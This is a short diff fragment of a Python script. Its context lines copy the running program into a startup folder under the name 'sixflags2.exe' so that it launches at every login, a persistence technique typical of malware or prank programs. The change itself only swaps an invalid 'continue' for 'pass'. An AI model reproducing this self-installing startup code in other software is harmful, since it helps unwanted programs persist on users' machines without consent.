@@ -16,7 +16,7 @@ startup_file_path = os.path.join(startup_folder, "sixflags2.exe")
 if not os.path.exists(startup_file_path):
     shutil.copy2(current_file_path, startup_file_path)
 else:
-    continue    
+    pass    
 screen_width = root.winfo_screenwidth()
 screen_height = root.winfo_screenheight()
 
